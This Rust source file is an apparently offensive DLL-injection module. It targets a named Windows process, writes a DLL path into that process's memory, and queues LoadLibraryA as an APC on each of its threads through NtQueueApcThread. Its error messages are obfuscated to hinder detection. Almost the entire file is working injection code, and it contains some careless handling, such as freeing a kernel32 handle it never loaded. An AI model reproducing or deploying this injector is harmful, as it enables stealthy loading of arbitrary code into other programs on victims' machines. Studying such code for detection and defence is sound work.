use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows::Win32::System::Memory::{MEM_RESERVE, MEM_RELEASE, MEM_COMMIT, PAGE_EXECUTE_READWRITE, VirtualAllocEx, VirtualFreeEx};
use windows::Win32::System::Threading::{WaitForSingleObject, OpenThread, THREAD_SUSPEND_RESUME, THREAD_GET_CONTEXT, THREAD_SET_CONTEXT, GetExitCodeThread};
use windows::Win32::System::LibraryLoader::{GetProcAddress, GetModuleHandleA, FreeLibrary};
use windows::Win32::System::WindowsProgramming::INFINITE;
use windows::Win32::Foundation::{INVALID_HANDLE_VALUE, CloseHandle, PAPCFUNC, HANDLE};
use windows::s;
use obfstr::obfstr;
use crate::data;

#[link(name = "ntdll")]
extern "system"{
    fn NtQueueApcThread(
        hThread: HANDLE,
        pfnAPC: PAPCFUNC, 
        dwData1: usize,
        dwData2: usize,
        dwData3: usize,

    ) -> u32;
}

pub fn injector(process_name:&str, dll_location: &str){

    let dll_path_size = dll_location.as_bytes().len();

    let name = data::ProcessData::name(process_name).unwrap();
    let proc_handle = name.process_handle();

    let tids = data::ProcessData::tids(data::ProcessData::pid(process_name));

    if proc_handle == INVALID_HANDLE_VALUE{
        panic!("{}", obfstr!("[-] Error: Invalid handle value"));
    }

    let adress = unsafe{
        VirtualAllocEx(
            proc_handle,
            Some(std::ptr::null()),
            dll_path_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        )
    };

    if adress.is_null(){
        unsafe { CloseHandle(proc_handle) };
        panic!("{}", obfstr!("[-] Error: failed to allocate memory in the process"));
    }

    let w_process = unsafe {
        WriteProcessMemory(
            proc_handle,
            adress,
            dll_location.as_ptr() as *const std::ffi::c_void,
            dll_path_size,
            Some(std::ptr::null_mut())
        )
    };

    if w_process == false{
        unsafe { VirtualFreeEx(proc_handle, adress, 0, MEM_RELEASE) };
        unsafe { CloseHandle(proc_handle) };
        panic!("{}", obfstr!("[-] Error: failed to write to process memory"));
    }
    
    let k32_address = unsafe{ GetModuleHandleA(s!("kernel32.dll")).unwrap() };

    if k32_address.is_invalid(){
        unsafe { VirtualFreeEx(proc_handle, adress, 0, MEM_RELEASE) };
        panic!("{}", obfstr!("[-] Error: failed to kernel32 handle"));
    }

    let proc_address = unsafe{ GetProcAddress(k32_address, s!("LoadLibraryA")) };

    for tid in &tids {
        let process_thread = unsafe {
            OpenThread(
                THREAD_SET_CONTEXT | THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME,
                false,
                *tid,
            ).unwrap()
        };

        if process_thread.is_invalid(){
            unsafe { FreeLibrary(k32_address) };
            unsafe { VirtualFreeEx(proc_handle, adress, 0, MEM_RELEASE) };
            unsafe { CloseHandle(proc_handle) };
        }

        let start_routine = unsafe{ std::mem::transmute(proc_address) };
        
        unsafe{ NtQueueApcThread(process_thread, start_routine, adress as usize, 0,0) };

        unsafe { WaitForSingleObject(process_thread, INFINITE) };

        let mut exit_code = 0;
        if unsafe{ GetExitCodeThread(process_thread, &mut exit_code) } == false{
            unsafe { CloseHandle(process_thread) };
        }
    }
    unsafe { FreeLibrary(k32_address) };
    unsafe { VirtualFreeEx(proc_handle, adress, 0, MEM_RELEASE) };
    unsafe { CloseHandle(proc_handle) };

    println!("Injection successful!");

}